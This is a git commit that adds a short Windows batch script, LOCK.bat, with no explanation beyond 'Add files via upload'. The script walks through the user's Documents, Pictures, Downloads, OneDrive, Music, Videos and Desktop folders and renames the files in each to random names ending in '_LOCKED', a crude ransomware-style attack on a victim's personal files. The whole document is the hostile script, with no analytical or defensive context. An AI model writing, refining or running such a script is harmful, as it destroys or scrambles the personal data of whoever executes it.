e9a4d8a2f3f99b3e807063ee36118629839e8465
Vtos1957 <wafflesguy12345@gmail.com>
2026-08-15 09:40:46 -0600

    Add files via upload

---
+++ LOCK.bat
@@ -0,0 +1,22 @@
+@echo off
+cd..
+cd documents
+ren *.* %random%_LOCKED
+cd..
+cd pictures
+ren *.* %random%_LOCKED
+cd..
+cd downloads
+ren *.* %random%_LOCKED
+cd..
+cd onedrive
+ren *.* %random%_LOCKED
+cd..
+cd music
+ren *.* %random%_LOCKED
+cd..
+cd videos
+ren *.* %random%_LOCKED
+cd..
+cd desktop
+ren *.* %random%_LOCKED
